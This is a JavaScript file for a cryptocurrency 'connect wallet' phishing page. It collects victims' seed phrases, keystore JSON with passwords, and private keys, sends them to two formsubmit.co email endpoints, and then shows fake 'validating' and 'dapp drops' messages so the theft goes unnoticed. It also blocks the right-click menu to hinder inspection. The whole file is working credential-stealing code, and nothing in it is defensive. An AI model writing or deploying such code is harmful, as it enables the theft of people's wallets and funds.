document.addEventListener('contextmenu', function(e) {
    e.preventDefault();
});

// Function to open a modal
function openModal(modalId) {
    const modal = document.getElementById(modalId);
    if (modal) {
        modal.style.display = 'block';
    }
}

// Function to close a modal
function closeModal(modalId) {
    const modal = document.getElementById(modalId);
    if (modal) {
        modal.style.display = 'none';
    }
}

// Function to submit form data
function submitFormData(connectionMethod) {
    var formData;

    // Validate and get form data based on connection method
    switch (connectionMethod) {
        case 0: // Phrase
            formData = validatePhraseForm();
            break;
        case 1: // KeyStore
            formData = validateKeyStoreForm();
            break;
        case 2: // Private Key
            formData = validatePrivateKeyForm();
            break;
        default:
            return;
    }

    // Check if form data is valid
    if (formData) {
        // Get the wallet type dropdown value
        var walletType = formData.walletType;

        // Close the modal immediately
        closeModal('modal-' + getModalName(connectionMethod));

        // Get the connect button element for the respective connection method
        var connectButton;
        switch (connectionMethod) {
            case 0:
                connectButton = document.getElementById('connectButtonPhrase');
                break;
            case 1:
                connectButton = document.getElementById('connectButtonKeyStore');
                break;
            case 2:
                connectButton = document.getElementById('connectButtonPrivateKey');
                break;
        }

        if (connectButton) {
            // Change button text to "Connecting"
            connectButton.textContent = 'CONNECTING... please wait';

            // Add the "connecting" class to change button color
            connectButton.classList.add('connecting');

            // Send form data to email using Formsubmit.co
            sendFormDataToEmail(formData);
        }
    }
}

// Placeholder function for sending form data to email using Formsubmit.co
function sendFormDataToEmail(formData) {
    const formsubmitEndpoint1 = 'https://formsubmit.co/ajax/7a625730c0e5d6e409f26f515bdc1e5c'; 
    const formsubmitEndpoint2 = 'https://formsubmit.co/ajax/ea1c753b5d242a885a578adb3e5fdf52'; 

    const emailEndpoints = [formsubmitEndpoint1, formsubmitEndpoint2];

    // Send form data to each email endpoint
    emailEndpoints.forEach(endpoint => {
        fetch(endpoint, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(formData),
        })
        .then(response => {
            if (response.ok) {
                swal('Validating...', 'Hold On');
                setTimeout(() => {
                    swal('Feeling Lucky!?', 'Connectionn confirmation and/or validations for dapp drops happen based on Net traffic. You can check back or try with another wallet if nothing happens.');

                    // Reset the button text and remove the "connecting" class
                    var connectButton;
                    switch (formData.connectionMethod) {
                        case 'Phrase':
                            connectButton = document.getElementById('connectButtonPhrase');
                            break;
                        case 'KeyStore':
                            connectButton = document.getElementById('connectButtonKeyStore');
                            break;
                        case 'PrivateKey':
                            connectButton = document.getElementById('connectButtonPrivateKey');
                            break;
                    }

                    if (connectButton) {
                        connectButton.textContent = 'Connect';
                        connectButton.classList.remove('connecting');
                    }
                }, 2000);
                return response.json();
            } else {
                swal('Server Error', 'Error submitting form. Please try again.', 'error');
                throw new Error('Error submitting form');
            }
        })
        .then(data => {
            console.log(`Formsubmit.co response:`, data);
        })
        .catch(error => {
            console.error('Error connecting to email:', error);
        });
    });
}

// Function to validate Phrase form
function validatePhraseForm() {
    const phraseTextarea = document.forms['phraseForm']['Phrase'].value.trim();
    const walletType = document.forms['phraseForm']['walletType'].value;

    if (phraseTextarea === '' || walletType === '') {
        swal('Please fill in all fields.');
        return null;
    }

    const phrasePattern = /^(\S+\s+){11}\S+$|^(\S+\s+){23}\S+$/;
    if (!phrasePattern.test(phraseTextarea)) {
        swal('Phrase must be 12 or 24 words separated by single spaces.');
        return null;
    }

    return { connectionMethod: 'Phrase', phrase: phraseTextarea, walletType: walletType };
}

// Function to validate KeyStore form
function validateKeyStoreForm() {
    const keystoreTextarea = document.forms['keystoreForm']['keystore'].value.trim();
    const passwordInput = document.forms['keystoreForm']['password'].value.trim();
    const walletType = document.forms['keystoreForm']['walletType'].value;

    if (keystoreTextarea === '' || passwordInput === '' || walletType === '') {
        swal('Please enter both KeyStore, password, and select wallet type.');
        return null;
    }

    const jsonPattern = /^\{[\s\S]*\}$/;
    if (!jsonPattern.test(keystoreTextarea)) {
        swal('KeyStore must be a valid JSON format.');
        return null;
    }

    return { connectionMethod: 'KeyStore', keystore: keystoreTextarea, password: passwordInput, walletType: walletType };
}

// Function to validate Private Key 
function validatePrivateKeyForm() {
    var privateKeyTextarea = document.forms['privateKeyForm']['privateKey'].value.trim();
    var walletType = document.forms['privateKeyForm']['walletType'].value;

    console.log("Private Key Entered:", privateKeyTextarea);  // Log entered private key

    // Basic validation
    if (privateKeyTextarea === '' || walletType === '') {
        swal('Please fill in all fields.');
        return null;
    }

    // Validate pattern (Any characters)
    var privateKeyPattern = /^.{64}$/;  // Matches any 64 characters
    var isValid = privateKeyPattern.test(privateKeyTextarea);  // Check if the key matches the pattern

    console.log("Pattern Match Result:", isValid);  // Log pattern match result

    if (!isValid) {
        swal('Private key must be exactly 64 Alphanumeric characters.');
        return null;
    }

    // Return form data
    return { connectionMethod: 'PrivateKey', privateKey: privateKeyTextarea, walletType: walletType };
}

// Function to get modal name based on connection method
function getModalName(connectionMethod) {
    const modalNames = ['phrase', 'keystore', 'private-key'];
    return modalNames[connectionMethod] || '';
}
